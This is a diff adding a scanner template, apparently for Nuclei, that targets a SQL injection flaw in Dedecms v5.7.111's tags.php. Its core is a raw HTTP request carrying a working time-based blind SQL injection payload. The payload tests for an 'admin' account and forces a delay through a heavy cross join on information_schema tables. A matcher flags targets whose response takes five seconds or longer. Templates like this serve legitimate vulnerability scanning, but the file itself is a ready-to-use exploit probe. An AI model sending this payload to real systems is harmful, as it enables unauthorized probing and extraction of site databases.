@@ -1,0 +1,36 @@
+id: dedecms-tags-sqli
+
+info:
+  name: dedecms-tags-sqli
+  author: apple
+  severity: high
+  description: Dedecms v5.7.111前台tags.php SQL注入漏洞--笛卡尔积盲注
+  reference:
+    - https://github.com/wy876/POC/blob/main/Dedecms%20v5.7.111前台tags.php%20SQL注入漏洞.md
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /tags.php?tag=a/alias/about%27and{`\%27`%20id}%3E0.1+or+if(exists(select+*+from+%23@__admin+where+userid+like'admin'),(select+count(*)+from+information_schema.tables+A,information_schema.tables+B),1)--%20\\ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Referer: https://lbxrmyyaliapp.api.swhcsoft.com:8083/userLogin.asp
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Sec-Ch-Ua-Platform: "Windows"
+        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        Sec-Ch-Ua-Mobile: ?0
+        Te: trailers
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
